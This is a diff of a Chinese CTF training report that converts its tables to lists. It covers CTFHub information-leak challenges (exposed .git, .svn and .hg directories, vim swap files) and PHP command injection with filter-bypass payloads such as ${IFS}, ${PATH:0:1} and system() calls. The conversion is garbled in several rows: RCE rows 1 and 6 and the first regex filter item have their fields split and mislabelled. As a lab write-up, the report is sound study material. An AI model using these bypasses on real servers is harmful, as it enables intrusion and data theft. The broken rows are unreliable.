@@ -1,124 +1,64 @@
 # CTF 实战训练报告 · task9
 
-> **训练内容**：环境安装 → 信息泄露漏洞 → PHP 命令执行与绕过
-> **训练周期**：3 天（0.5 + 1 + 1）
-> **实验环境**：WSL2 + Kali Linux Rolling + Windows Terminal
-> **训练方式**：CTFHub 靶场通关 + 本地复刻（每个漏洞都在自己的虚拟机上复现）
-> **成果**：**CTFHub 通关 17 题，取得 17 个 flag**
-
----
-
-## 摘要
-
-| 阶段 | 内容 | 时长 | 产出 |
-|---|---|---|---|
-| 第一章 | 环境安装 | 0.5 day | WSL2 + Kali + 基础 Linux 命令表 |
-| 第二章 | 信息泄露漏洞 | 1 day | 9 个子题通关 + 五问解答 + 三类版本库统一框架 |
-| 第三章 | PHP 命令执行与绕过 | 1 day | 8 个子题通关 + 8 个函数实测对比 + 6 类绕过 |
-
-**核心结论（一句话）**
-
-> **信息泄露是"该藏的东西被当成了公开的东西"；命令执行是"用户输入被拼进了要执行的字符串"。**
-> **两者的共同点：漏洞不在代码逻辑里，而在"信任边界"上。**
-
----
-
 # 第一章 环境安装（0.5 day）
-
-## 1.1 为什么用虚拟机
-
-**三个理由：**
-
-| 理由 | 说明 |
-|---|---|
-| **目标通常是 Linux** | 多数靶场、Web 中间件、工具链都在 Linux 上 |
-| **工具需要 Linux** | `sqlite3` / `hg` / `svn` / `rip-*` / `php_filter_chain_generator` 等 |
-| **隔离** | 打靶过程可能触发反弹 shell、下载未知文件，不能污染宿主 |
-
-**不推荐用云服务器**：反弹 shell、内网横向、扫描类操作容易被云厂商封禁或告警。
-
-## 1.2 WSL2 + Kali Linux 安装
-
-```powershell
-# ① 启用 WSL2（管理员 PowerShell）
-wsl --install
-
-# ② 安装 Kali
-wsl --install -d kali-linux
-
-# ③ 验证
-wsl -d kali-linux -- cat /etc/os-release
-```
-
-**本次实际环境：**
-
-```
-Kali GNU/Linux Rolling
-PHP 8.4.24 (cli)          ← 本地实测用
-Mercurial 7.2.3
-Subversion 1.14.5
-sqlite3 / python3 / curl / git 均自带
-```
-
-**网络说明**：Windows 侧 git 需要配置代理才能连 GitHub（本项目用 `http.proxy=http://127.0.0.1:7890`）；Kali 内访问 GitHub 偶尔受限，改用 `gh-proxy.com` 镜像下载工具。
 
 ## 1.3 基础 Linux 命令（本次实战高频用到）
 
 ### 1.3.1 目录与文件列举
-
-| 命令 | 作用 | 本次使用场景 |
-|---|---|---|
-| `ls` | 列当前目录 | 命令注入后第一句 |
-| `ls -la` | 列出含隐藏文件、权限、大小、时间 | 判断 `flag_xxx.php` 是不是目录 |
-| `pwd` | 当前工作目录 | **一步定位 web 根** |
-| `find / -name "*flag*"` | 按名字全盘找 | 找 flag 文件（**别加 `-maxdepth`，会漏**） |
-| `find / -name index.php` | 按已知文件名反推目录 | 找 web 根 |
-| `file` / `stat` | 判断文件类型 | |
+- **`ls`**
+  - 作用：列当前目录
+  - 本次使用场景：命令注入后第一句
+- **`ls -la`**
+  - 作用：列出含隐藏文件、权限、大小、时间
+  - 本次使用场景：判断 `flag_xxx.php` 是不是目录
+- **`pwd`**
+  - 作用：当前工作目录
+  - 本次使用场景：**一步定位 web 根**
+- **`find / -name "*flag*"`**
+  - 作用：按名字全盘找
+  - 本次使用场景：找 flag 文件（**别加 `-maxdepth`，会漏**）
+- **`find / -name index.php`**
+  - 作用：按已知文件名反推目录
+  - 本次使用场景：找 web 根
+- **`file` / `stat`**
+  - 作用：判断文件类型
 
 ### 1.3.2 文件读取
 
-| 命令 | 特点 |
-|---|---|
-| `cat` | 最常用，但**常被过滤** |
-| `tac` | **cat 反过来**，按行逆序输出 —— 绕过 `cat` 过滤的首选 |
-| `head -1` / `tail` | 取前/后 N 行 |
-| `sort` / `nl` / `rev` | 排序 / 加行号 / 反转 |
-| `base64` | 编码输出 —— **避开 HTML 特殊字符的神器** |
-| `grep -r "ctfhub" /var/www/html/` | **按内容找文件（最准）** |
-| `xxd` / `od` | 十六进制查看 |
-| `strings` | 从二进制里捞可打印字符串 |
+- **`cat`**：最常用，但**常被过滤**
+- **`tac`**：**cat 反过来**，按行逆序输出 —— 绕过 `cat` 过滤的首选
+- **`head -1` / `tail`**：取前/后 N 行
+- **`sort` / `nl` / `rev`**：排序 / 加行号 / 反转
+- **`base64`**：编码输出 —— **避开 HTML 特殊字符的神器**
+- **`grep -r "ctfhub" /var/www/html/`**：**按内容找文件（最准）**
+- **`xxd` / `od`**：十六进制查看
+- **`strings`**：从二进制里捞可打印字符串
 
 ### 1.3.3 内容特征查找
 
-| 命令 | 作用 |
-|---|---|
-| `grep -r ctfhub /var/www/html/` | 一步出"路径 + 文件名 + 内容" |
-| `grep -ro "ctfhub{[^}]*}" /` | 只输出匹配部分 |
-| `strings .hg/store/00changelog.i` | 从二进制元数据里找明文 |
-| `od -A d -t x1z file` | 十六进制 + ASCII 双栏，看文件头 |
+- **`grep -r ctfhub /var/www/html/`**：一步出"路径 + 文件名 + 内容"
+- **`grep -ro "ctfhub{[^}]*}" /`**：只输出匹配部分
+- **`strings .hg/store/00changelog.i`**：从二进制元数据里找明文
+- **`od -A d -t x1z file`**：十六进制 + ASCII 双栏，看文件头
 
 ### 1.3.4 数据处理
 
-| 命令 | 作用 |
-|---|---|
-| `base64 -d` | **解码（GNU 版宽容，会自动跳过非 base64 字符）** |
-| `openssl base64 -d` | 严格版，遇到垃圾字符直接失败 |
-| `grep -oE '^[A-Za-z0-9+/=]+'` | 从混有 HTML 的响应里抠出 base64 |
-| `sed 's/<.*//'` / `cut -d'<' -f1` | 砍掉 HTML 尾巴 |
-| `awk '{print $4"\t"$2}'` | 取指定列（Git index 差集用） |
-| `comm -23 <(...) <(...)` | 求差集（Git Index 题核心） |
-| `tr -d '\000'` | 去掉 NUL 字节 |
+- **`base64 -d`**：**解码（GNU 版宽容，会自动跳过非 base64 字符）**
+- **`openssl base64 -d`**：严格版，遇到垃圾字符直接失败
+- **`grep -oE '^[A-Za-z0-9+/=]+'`**：从混有 HTML 的响应里抠出 base64
+- **`sed 's/<.*//'` / `cut -d'<' -f1`**：砍掉 HTML 尾巴
+- **`awk '{print $4"\t"$2}'`**：取指定列（Git index 差集用）
+- **`comm -23 <(...) <(...)`**：求差集（Git Index 题核心）
+- **`tr -d '\000'`**：去掉 NUL 字节
 
 ### 1.3.5 版本库工具
 
-| 工具 | 用途 |
-|---|---|
-| `git` | Git 泄露题的全部操作 |
-| `sqlite3` | 读 SVN 的 `wc.db` |
-| `hg`（mercurial） | 读 HG 的 revlog |
-| `svn` | 复刻 SVN 仓库 |
-| `rip-svn.pl` / `rip-hg.pl` | dvcs-ripper 的自动化脚本 |
-| `php_filter_chain_generator.py` | 生成 `php://filter` 过滤器链 RCE payload |
+- **`git`**：Git 泄露题的全部操作
+- **`sqlite3`**：读 SVN 的 `wc.db`
+- **`hg`（mercurial）**：读 HG 的 revlog
+- **`svn`**：复刻 SVN 仓库
+- **`rip-svn.pl` / `rip-hg.pl`**：dvcs-ripper 的自动化脚本
+- **`php_filter_chain_generator.py`**：生成 `php://filter` 过滤器链 RCE payload
 
 ---
 
@@ -128,25 +68,54 @@ sqlite3 / python3 / curl / git 均自带
 
 **CTFHub「信息泄露」模块 9 题全部通关：**
 
-| # | 题型 | flag | 关键技术 |
-|---|---|---|---|
-| 1 | 网站源码 | `ctfhub{95c6f03d7cda19058d88ec1f}` | 备份包字典 |
-| 2 | bak 文件 | `ctfhub{ff20cd30144373eedaa01abc}` | 后缀爆破 |
-| 3 | vim 缓存 | `ctfhub{1bbffdd2cca2f93ddc0ca8d8}` | `.swp` 结构 |
-| 4 | .DS_Store | `ctfhub{2e801a81a591f99ffca80e07}` | macOS 元数据解析 |
-| 5 | Git Log | `ctfhub{dc8b0894d5a5689a22a35ffe}` | reflog + `git show` |
-| 6 | Git Stash | `ctfhub{03f0f3f844084d7134cedad3}` | `refs/stash` |
-| 7 | Git 未删变体 | `ctfhub{b0571eeb61f6343ced553555}` | reflog 只有 2 行 |
-| 8 | SVN | `ctfhub{6fd7676ba56da2a90a11af9a}` | `wc.db` + `PRISTINE.refcount` |
-| 9 | HG | `ctfhub{9260b70ead69a60fb2e0d968}` | revlog + `_`→`__` 编码 |
+- **1**
+  - 题型：网站源码
+  - flag：`ctfhub{95c6f03d7cda19058d88ec1f}`
+  - 关键技术：备份包字典
+- **2**
+  - 题型：bak 文件
+  - flag：`ctfhub{ff20cd30144373eedaa01abc}`
+  - 关键技术：后缀爆破
+- **3**
+  - 题型：vim 缓存
+  - flag：`ctfhub{1bbffdd2cca2f93ddc0ca8d8}`
+  - 关键技术：`.swp` 结构
+- **4**
+  - 题型：.DS_Store
+  - flag：`ctfhub{2e801a81a591f99ffca80e07}`
+  - 关键技术：macOS 元数据解析
+- **5**
+  - 题型：Git Log
+  - flag：`ctfhub{dc8b0894d5a5689a22a35ffe}`
+  - 关键技术：reflog + `git show`
+- **6**
+  - 题型：Git Stash
+  - flag：`ctfhub{03f0f3f844084d7134cedad3}`
+  - 关键技术：`refs/stash`
+- **7**
+  - 题型：Git 未删变体
+  - flag：`ctfhub{b0571eeb61f6343ced553555}`
+  - 关键技术：reflog 只有 2 行
+- **8**
+  - 题型：SVN
+  - flag：`ctfhub{6fd7676ba56da2a90a11af9a}`
+  - 关键技术：`wc.db` + `PRISTINE.refcount`
+- **9**
+  - 题型：HG
+  - flag：`ctfhub{9260b70ead69a60fb2e0d968}`
+  - 关键技术：revlog + `_`→`__` 编码
 
 **另有两道独立复现（非模块题，用于验证"不是抄 WP"）：**
 
-| 复现对象 | flag | 说明 |
-|---|---|---|
-| Git Log 独立复现 | `ctfhub{009ee4ed36138139d7349d59}` | 换实例重新走一遍 |
-| Git Stash 独立复现 | `ctfhub{053da77b26b117ed9a380b03}` | 同上 |
-| HG 第二实例 | `ctfhub{52dd316df7c89131d95b8161}` | 验证文件名随机化 |
+- **Git Log 独立复现**
+  - flag：`ctfhub{009ee4ed36138139d7349d59}`
+  - 说明：换实例重新走一遍
+- **Git Stash 独立复现**
+  - flag：`ctfhub{053da77b26b117ed9a380b03}`
+  - 说明：同上
+- **HG 第二实例**
+  - flag：`ctfhub{52dd316df7c89131d95b8161}`
+  - 说明：验证文件名随机化
 
 **第一轮（更早的记录，同模块）：**
 
@@ -166,22 +135,36 @@ ctfhub{d5b85603ca77329a3ae5a18}   Git 历史
 
 **`.git` 里有什么：**
 
-| 内容 | 位置 | 危害 |
-|---|---|---|
-| 全部源码（每个版本） | `objects/` | 完整源码 |
-| 全部提交历史 | `objects/` + `refs/` | 开发过程、注释里的密码 |
-| 未提交改动 | `index` | 暂存区敏感文件 |
-| 被"藏起来"的改动 | `refs/stash` | 连 commit 都没进 |
-| 被"删掉"的东西 | `objects/` + `logs/` | `git rm` 删不掉对象 |
+- **全部源码（每个版本）**
+  - 位置：`objects/`
+  - 危害：完整源码
+- **全部提交历史**
+  - 位置：`objects/` + `refs/`
+  - 危害：开发过程、注释里的密码
+- **未提交改动**
+  - 位置：`index`
+  - 危害：暂存区敏感文件
+- **被"藏起来"的改动**
+  - 位置：`refs/stash`
+  - 危害：连 commit 都没进
+- **被"删掉"的东西**
+  - 位置：`objects/` + `logs/`
+  - 危害：`git rm` 删不掉对象
 
 **四种变体与判据：**
 
-| 变体 | 判据 | 提取命令 |
-|---|---|---|
-| **Log** | reflog 有 `remove flag` | `git show <add flag 的哈希>` |
-| **Stash** | `refs/stash` 200 / reflog 有 `reset` | `git stash show -p` |
-| **Index** | index 与 HEAD 的 blob 差集非空 | `git diff --cached` |
-| **未删** | reflog 只有 `init → add flag` | `ls` + `cat` |
+- ****Log****
+  - 判据：reflog 有 `remove flag`
+  - 提取命令：`git show <add flag 的哈希>`
+- ****Stash****
+  - 判据：`refs/stash` 200 / reflog 有 `reset`
+  - 提取命令：`git stash show -p`
+- ****Index****
+  - 判据：index 与 HEAD 的 blob 差集非空
+  - 提取命令：`git diff --cached`
+- ****未删****
+  - 判据：reflog 只有 `init → add flag`
+  - 提取命令：`ls` + `cat`
 
 **四条命令兜底（下载后各打一遍）：**
 
@@ -228,10 +211,14 @@ index.bak.php  →  .php  →  交给 PHP  →  不泄露
 
 **两代结构：**
 
-| 版本 | `.svn` 位置 | 元数据 | 内容 |
-|---|---|---|---|
-| ≤ 1.6 | 每个子目录 | `entries`（纯文本，有文件列表） | `text-base/<名>.svn-base` |
-| ≥ 1.7 | 只有根目录 | `wc.db`（SQLite） | `pristine/<sha1前2位>/<sha1>.svn-base` |
+- **≤ 1.6**
+  - `.svn` 位置：每个子目录
+  - 元数据：`entries`（纯文本，有文件列表）
+  - 内容：`text-base/<名>.svn-base`
+- **≥ 1.7**
+  - `.svn` 位置：只有根目录
+  - 元数据：`wc.db`（SQLite）
+  - 内容：`pristine/<sha1前2位>/<sha1>.svn-base`
 
 **1.7+ 打法（实测）：**
 
@@ -262,11 +249,15 @@ done | grep -a ctfhub
 
 **三个关键文件：**
 
-| 文件 | 作用 | 实测 |
-|---|---|---|
-| `.hg/last-message.txt` | 最后一次 commit message | `add flag` |
-| `.hg/store/fncache` | 文件清单缓存 | 每行一个 store 路径 |
-| `.hg/dirstate` | 当前文件列表（二进制） | `strings` 出 `flag_xxx.txt` |
+- **`.hg/last-message.txt`**
+  - 作用：最后一次 commit message
+  - 实测：`add flag`
+- **`.hg/store/fncache`**
+  - 作用：文件清单缓存
+  - 实测：每行一个 store 路径
+- **`.hg/dirstate`**
+  - 作用：当前文件列表（二进制）
+  - 实测：`strings` 出 `flag_xxx.txt`
 
 **⚠️ 两个致命细节：**
 
@@ -286,11 +277,9 @@ fncache 里：data/flag_807728508.txt.i
 └┬┘ 'u' = 后面是原文（不是 zlib）
 ```
 
-| 首字节 | 含义 |
-|---|---|
-| `'u'` (0x75) | 原文 |
-| `'x'` (0x78) | zlib |
-| `0x00` | 原文（无标记） |
+- **`'u'` (0x75)**：原文
+- **`'x'` (0x78)**：zlib
+- **`0x00`**：原文（无标记）
 
 **最简打法：**
 
@@ -325,19 +314,21 @@ curl -s "$T/.hg/store/data/flag__807728508.txt.i" | grep -ao 'ctfhub{[^}]*}'
 
 **vim 缓存 3 类 8 种：**
 
-| 类型 | 文件名 | 触发 |
-|---|---|---|
-| swap | `.文件名.swp` → `.swo` → `.swn` → `.swm` → `.swl`... | 编辑中崩溃/被 kill |
-| undo | `.文件名.un~` | `set undofile` |
-| backup | `文件名~` | `set backup` |
+- **swap**
+  - 文件名：`.文件名.swp` → `.swo` → `.swn` → `.swm` → `.swl`...
+  - 触发：编辑中崩溃/被 kill
+- **undo**
+  - 文件名：`.文件名.un~`
+  - 触发：`set undofile`
+- **backup**
+  - 文件名：`文件名~`
+  - 触发：`set backup`
 
 **swap 的三种取法（实测对比）：**
 
-| 方法 | 可靠性 |
-|---|---|
-| **`grep -ao "flag{[^}]*}" .index.php.swp`** | ⭐⭐⭐ **完整** |
-| `strings` | ⭐⭐ 顺带能拿到服务器绝对路径 |
-| `vim -r` | ⚠️ **可能只写了一半 → 恢复残缺** |
+- ****`grep -ao "flag{[^}]*}" .index.php.swp`****：⭐⭐⭐ **完整**
+- **`strings`**：⭐⭐ 顺带能拿到服务器绝对路径
+- **`vim -r`**：⚠️ **可能只写了一半 → 恢复残缺**
 
 > **认知修正**：不是"必须 `vim -r`"。swap 按块异步写，崩溃时可能只写一半，`grep` 反而更完整。
 
@@ -350,24 +341,61 @@ curl -s "$T/.hg/store/data/flag__807728508.txt.i" | grep -ao 'ctfhub{[^}]*}'
 
 **统一四步框架：探测 → 拿清单 → 取内容 → 解码。**
 
-| 类型 | ① 探测 | ② 拿清单 | ③ 取内容 | ④ 解码 |
-|---|---|---|---|---|
-| 源码包 | 字典 | 解压 | 文件名当 URL | — |
-| `.bak` | 加后缀 | — | `curl` | — |
-| vim swp | `.文件名.swp` | — | `curl -O` | `grep -a` |
-| `.DS_Store` | 固定路径 | 解析 filename | 文件名当 URL | `ds_store` 库 |
-| **Git** | `.git/HEAD` | reflog / index / refs | `objects/<h[:2]>/<h[2:]>` | **zlib** |
-| **SVN** | `.svn/wc.db` | `NODES` / `PRISTINE` | `pristine/<h[:2]>/<h>` | **原文** |
-| **HG** | `.hg/requires` | `fncache` + `dirstate` | `store/data/<编码名>.i` | **zlib 或 `'u'`+原文** |
-| `.env` | 固定路径 | — | `curl` | **base64 -d** |
+- **源码包**
+  - ① 探测：字典
+  - ② 拿清单：解压
+  - ③ 取内容：文件名当 URL
+  - ④ 解码：—
+- **`.bak`**
+  - ① 探测：加后缀
+  - ② 拿清单：—
+  - ③ 取内容：`curl`
+  - ④ 解码：—
+- **vim swp**
+  - ① 探测：`.文件名.swp`
+  - ② 拿清单：—
+  - ③ 取内容：`curl -O`
+  - ④ 解码：`grep -a`
+- **`.DS_Store`**
+  - ① 探测：固定路径
+  - ② 拿清单：解析 filename
+  - ③ 取内容：文件名当 URL
+  - ④ 解码：`ds_store` 库
+- ****Git****
+  - ① 探测：`.git/HEAD`
+  - ② 拿清单：reflog / index / refs
+  - ③ 取内容：`objects/<h[:2]>/<h[2:]>`
+  - ④ 解码：**zlib**
+- ****SVN****
+  - ① 探测：`.svn/wc.db`
+  - ② 拿清单：`NODES` / `PRISTINE`
+  - ③ 取内容：`pristine/<h[:2]>/<h>`
+  - ④ 解码：**原文**
+- ****HG****
+  - ① 探测：`.hg/requires`
+  - ② 拿清单：`fncache` + `dirstate`
+  - ③ 取内容：`store/data/<编码名>.i`
+  - ④ 解码：**zlib 或 `'u'`+原文**
+- **`.env`**
+  - ① 探测：固定路径
+  - ② 拿清单：—
+  - ③ 取内容：`curl`
+  - ④ 解码：**base64 -d**
 
 **三个版本库的差异只有三条：**
 
-| 差异 | Git | SVN | HG |
-|---|---|---|---|
-| 清单来源 | reflog + index + refs | `wc.db`（SQLite） | `fncache` + `dirstate` |
-| **内容路径由什么决定** | **内容哈希** | **内容哈希** | **文件名编码** ★ |
-| 内容编码 | zlib | 原文 | zlib 或 `'u'`+原文 |
+- **清单来源**
+  - Git：reflog + index + refs
+  - SVN：`wc.db`（SQLite）
+  - HG：`fncache` + `dirstate`
+- ****内容路径由什么决定****
+  - Git：**内容哈希**
+  - SVN：**内容哈希**
+  - HG：**文件名编码** ★
+- **内容编码**
+  - Git：zlib
+  - SVN：原文
+  - HG：zlib 或 `'u'`+原文
 
 > **记忆法：Git/SVN 按"内容指纹"找书（哈希），HG 按"书名"找书（文件名编码）。**
 
@@ -402,12 +430,10 @@ curl -s "$T/.hg/store/data/flag__807728508.txt.i" | grep -ao 'ctfhub{[^}]*}'
 
 **③ 动机：便利优先于安全**
 
-| 便利做法 | 安全但麻烦 |
-|---|---|
-| `git clone` 部署 | `git archive` 打干净包 |
-| `svn checkout` 部署 | `svn export` |
-| `.env` 放 web 根 | 环境变量 / 配置中心 |
-| 备份放同目录 | 备份到 web 根之外 |
+- **`git clone` 部署**：`git archive` 打干净包
+- **`svn checkout` 部署**：`svn export`
+- **`.env` 放 web 根**：环境变量 / 配置中心
+- **备份放同目录**：备份到 web 根之外
 
 **结论：信息泄露的根本原因不是技术问题，是流程问题。**
 **防御靠的不是 WAF，是部署前那一条 `rm -rf .git .svn .env *.bak *.swp`。**
@@ -426,13 +452,11 @@ done
 
 **每个漏洞都在本地 `~/infoleak-lab` 或 Kali 的 `/tmp` 下用 `php -S` 复刻过：**
 
-| 类型 | 本地复刻方式 |
-|---|---|
-| Git 四种变体 | `git init` + 手工制造 reflog / stash / index 差异 |
-| SVN | `svnadmin create` + `svn checkout` + 删文件 |
-| HG | `hg init` + `hg commit` + `hg rm` |
-| 备份文件 / vim | 直接造 `.bak` / `.swp` |
-| `.DS_Store` | Python 生成 |
+- **Git 四种变体**：`git init` + 手工制造 reflog / stash / index 差异
+- **SVN**：`svnadmin create` + `svn checkout` + 删文件
+- **HG**：`hg init` + `hg commit` + `hg rm`
+- **备份文件 / vim**：直接造 `.bak` / `.swp`
+- **`.DS_Store`**：Python 生成
 
 **典型复刻脚本位置**：`D:\VMs\logs\*.sh`（`gitlog-run.sh`、`svn-pwn.sh`、`hg-dig.sh`、`lfi-trace2.sh` 等）。
 
@@ -455,25 +479,57 @@ system("ping -c 4 " . $_GET['ip']);
 
 **两个层面：**
 
-| 层面 | 执行什么 | 函数 |
-|---|---|---|
-| **系统命令执行** | 交给 shell | `system` / `exec` / `shell_exec` / `passthru` / `popen` / `proc_open` / 反引号 |
-| **代码执行** | 交给 PHP 解释器 | `eval` / `assert` / `create_function` / `preg_replace(/e)` / `call_user_func` / `array_map` |
+- ****系统命令执行****
+  - 执行什么：交给 shell
+  - 函数：`system` / `exec` / `shell_exec` / `passthru` / `popen` / `proc_open` / 反引号
+- ****代码执行****
+  - 执行什么：交给 PHP 解释器
+  - 函数：`eval` / `assert` / `create_function` / `preg_replace(/e)` / `call_user_func` / `array_map`
 
 ## 3.2 八个系统命令执行函数（PHP 8.4 实测）
 
 **测试命令**：`echo line1; echo line2; id -un`
 
-| 函数 | 直接回显 | 返回值 | 多行 | 退出码 |
-|---|---|---|---|---|
-| **`system()`** | **✅ 有** | `string`（最后一行） | ✅ | ✅ 第 2 参数 |
-| **`exec()`** | ❌ 无 | `string`（最后一行） | 需第 2 参数 | ✅ 第 3 参数 |
-| **`shell_exec()`** | ❌ 无 | `string`（**全部输出**） | ✅ | ❌ |
-| **`` `反引号` ``** | ❌ 无 | `string`（全部） | ✅ | ❌ |
-| **`passthru()`** | **✅ 有**（原始二进制） | `null` | ✅ | ✅ 第 2 参数 |
-| **`popen()`** | ❌ 无 | `resource`（文件指针） | ✅ `fread` | ✅ `pclose` |
-| **`proc_open()`** | ❌ 无 | `resource`（进程句柄） | ✅ 管道 | ✅ `proc_close` |
-| **`pcntl_exec()`** | **✅ 有** | 无（替换进程） | ✅ | ❌ |
+- ****`system()`****
+  - 直接回显：**✅ 有**
+  - 返回值：`string`（最后一行）
+  - 多行：✅
+  - 退出码：✅ 第 2 参数
+- ****`exec()`****
+  - 直接回显：❌ 无
+  - 返回值：`string`（最后一行）
+  - 多行：需第 2 参数
+  - 退出码：✅ 第 3 参数
+- ****`shell_exec()`****
+  - 直接回显：❌ 无
+  - 返回值：`string`（**全部输出**）
+  - 多行：✅
+  - 退出码：❌
+- ****`` `反引号` ``****
+  - 直接回显：❌ 无
+  - 返回值：`string`（全部）
+  - 多行：✅
+  - 退出码：❌
+- ****`passthru()`****
+  - 直接回显：**✅ 有**（原始二进制）
+  - 返回值：`null`
+  - 多行：✅
+  - 退出码：✅ 第 2 参数
+- ****`popen()`****
+  - 直接回显：❌ 无
+  - 返回值：`resource`（文件指针）
+  - 多行：✅ `fread`
+  - 退出码：✅ `pclose`
+- ****`proc_open()`****
+  - 直接回显：❌ 无
+  - 返回值：`resource`（进程句柄）
+  - 多行：✅ 管道
+  - 退出码：✅ `proc_close`
+- ****`pcntl_exec()`****
+  - 直接回显：**✅ 有**
+  - 返回值：无（替换进程）
+  - 多行：✅
+  - 退出码：❌
 
 **实测输出对照：**
 
@@ -502,29 +558,43 @@ proc_open          回显: （空）                    返回: 'line1\nline2\nk
 
 ### 选型速查
 
-| 需求 | 用哪个 |
-|---|---|
-| 要立刻看到结果 | **`system`** |
-| 结果要处理/过滤 | `shell_exec`（全部字符串） |
-| 要多行数组 | `exec` + 第 2 参数 |
-| 要退出码 | `system` / `exec` / `passthru` |
-| 要 stderr | `proc_open` |
-| 双向交互 | `popen("w")` / `proc_open` |
-| **无回显时** | `exec` / `shell_exec` 拿返回值再外带 |
+- **要立刻看到结果**：**`system`**
+- **结果要处理/过滤**：`shell_exec`（全部字符串）
+- **要多行数组**：`exec` + 第 2 参数
+- **要退出码**：`system` / `exec` / `passthru`
+- **要 stderr**：`proc_open`
+- **双向交互**：`popen("w")` / `proc_open`
+- ****无回显时****：`exec` / `shell_exec` 拿返回值再外带
 
 ## 3.3 代码执行类函数
 
-| 函数 | 说明 | 版本限制 |
-|---|---|---|
-| **`eval()`** | 执行任意 PHP 代码（语言结构） | 全版本 |
-| `assert()` | 老版本可执行字符串 | **PHP 7.2+ 不再执行字符串** |
-| `create_function()` | 动态造函数 | PHP 7.2 废弃，8 移除 |
-| `preg_replace(/e)` | 执行替换结果 | **PHP 7 移除** |
-| `call_user_func()` / `call_user_func_array()` | 回调 | 全版本 |
-| `array_map` / `array_filter` / `array_reduce` | 回调 | 全版本 |
-| `usort` / `uasort` | 排序回调 | 全版本 |
-| `ob_start()` | 输出缓冲回调 | 全版本 |
-| `include` / `require` | 文件包含（配合伪协议） | 全版本 |
+- ****`eval()`****
+  - 说明：执行任意 PHP 代码（语言结构）
+  - 版本限制：全版本
+- **`assert()`**
+  - 说明：老版本可执行字符串
+  - 版本限制：**PHP 7.2+ 不再执行字符串**
+- **`create_function()`**
+  - 说明：动态造函数
+  - 版本限制：PHP 7.2 废弃，8 移除
+- **`preg_replace(/e)`**
+  - 说明：执行替换结果
+  - 版本限制：**PHP 7 移除**
+- **`call_user_func()` / `call_user_func_array()`**
+  - 说明：回调
+  - 版本限制：全版本
+- **`array_map` / `array_filter` / `array_reduce`**
+  - 说明：回调
+  - 版本限制：全版本
+- **`usort` / `uasort`**
+  - 说明：排序回调
+  - 版本限制：全版本
+- **`ob_start()`**
+  - 说明：输出缓冲回调
+  - 版本限制：全版本
+- **`include` / `require`**
+  - 说明：文件包含（配合伪协议）
+  - 版本限制：全版本
 
 **PHP 8 实测：**
 
@@ -539,28 +609,52 @@ array_map('system', ['id']);              // ✅
 
 ## 3.4 其它可注入命令的地方
 
-| 位置 | 说明 |
-|---|---|
-| `mail($to,$sub,$msg,$hdr,$param)` | 第 5 参数传给 `sendmail` |
-| `putenv("LD_PRELOAD=...")` | 设置环境变量，劫持动态库 |
-| `imap_open($mailbox,...)` | mailbox 参数可注入 |
-| `error_log($msg, 1, $to)` | `$to` 传给 `sendmail` |
-| `mb_send_mail` | 同 `mail` |
-| `pcntl_exec` | 常被忘在 `disable_functions` 之外 |
-| `dl()` | 加载 PHP 扩展 |
-| `ImageMagick` 的 `convert` | 文件名注入 |
+- **`mail($to,$sub,$msg,$hdr,$param)`**：第 5 参数传给 `sendmail`
+- **`putenv("LD_PRELOAD=...")`**：设置环境变量，劫持动态库
+- **`imap_open($mailbox,...)`**：mailbox 参数可注入
+- **`error_log($msg, 1, $to)`**：`$to` 传给 `sendmail`
+- **`mb_send_mail`**：同 `mail`
+- **`pcntl_exec`**：常被忘在 `disable_functions` 之外
+- **`dl()`**：加载 PHP 扩展
+- **`ImageMagick` 的 `convert`**：文件名注入
 
 ## 3.5 CTFHub RCE 模块通关（8 题）
 
-| # | 题型 | 过滤 | 绕过 | flag |
-|---|---|---|---|---|
-| 1 | **命令注入-无过滤** | 无 | `\|cat` | `ctfhub{64e8e0dae77db7d9c15ef8ab}` |
-| 2 | **eval 代码执行** | 无 | `?cmd=system("ls /");` | `ctfhub{7234bb617c6421e4b8e40365}` |
-| 3 | **过滤 cat** | `cat` | `tac` / `c\at` / `/bin/c?t` | `ctfhub{5c3d2c0615beb813269640b6}` |
-| 4 | **过滤空格** | 空格 | `${IFS}` | `ctfhub{7d4f698eda802c44829c9db7}` |
-| 5 | **过滤目录分隔符** | `/` | `${PATH:0:1}` | `ctfhub{fba85d19b6751d803b3cee7c}` |
-| 6 | **过滤运算符** | `\|` `&` | `;` / 换行 | `ctfhub{613d57ca6515a6b766b7caa0}` |
-| 7 | **综合练习** | 8 项全过滤 | 见下 | `ctfhub{7d928b22123076276bb32251}` |
+- **1**
+  - 题型：**命令注入-无过滤**
+  - 过滤：无
+  - 绕过：`\
+  - flag：cat`
+- **2**
+  - 题型：**eval 代码执行**
+  - 过滤：无
+  - 绕过：`?cmd=system("ls /");`
+  - flag：`ctfhub{7234bb617c6421e4b8e40365}`
+- **3**
+  - 题型：**过滤 cat**
+  - 过滤：`cat`
+  - 绕过：`tac` / `c\at` / `/bin/c?t`
+  - flag：`ctfhub{5c3d2c0615beb813269640b6}`
+- **4**
+  - 题型：**过滤空格**
+  - 过滤：空格
+  - 绕过：`${IFS}`
+  - flag：`ctfhub{7d4f698eda802c44829c9db7}`
+- **5**
+  - 题型：**过滤目录分隔符**
+  - 过滤：`/`
+  - 绕过：`${PATH:0:1}`
+  - flag：`ctfhub{fba85d19b6751d803b3cee7c}`
+- **6**
+  - 题型：**过滤运算符**
+  - 过滤：`\
+  - 绕过：` `&`
+  - flag：`;` / 换行
+- **7**
+  - 题型：**综合练习**
+  - 过滤：8 项全过滤
+  - 绕过：见下
+  - flag：`ctfhub{7d928b22123076276bb32251}`
 
 ### 综合题的源码（最难的）
 
@@ -570,16 +664,30 @@ preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)
 
 **8 个过滤项：**
 
-| # | 模式 | 匹配 |
-|---|---|---|
-| 1 | `\|` | 竖线（`\|` 是正则元字符，要转义） |
-| 2 | `&` | 与号 |
-| 3 | `;` | 分号 |
-| 4 | ` ` | 空格 |
-| 5 | `\/` | 斜杠（`/` 是定界符，要转义） |
-| 6 | `cat` | 字符串 |
-| 7 | **`flag`** | 字符串 |
-| 8 | `ctfhub` | 字符串 |
+- **1**
+  - 模式：`\
+  - 匹配：`
+- **2**
+  - 模式：`&`
+  - 匹配：与号
+- **3**
+  - 模式：`;`
+  - 匹配：分号
+- **4**
+  - 模式：` `
+  - 匹配：空格
+- **5**
+  - 模式：`\/`
+  - 匹配：斜杠（`/` 是定界符，要转义）
+- **6**
+  - 模式：`cat`
+  - 匹配：字符串
+- **7**
+  - 模式：**`flag`**
+  - 匹配：字符串
+- **8**
+  - 模式：`ctfhub`
+  - 匹配：字符串
 
 **最终 payload：**
 
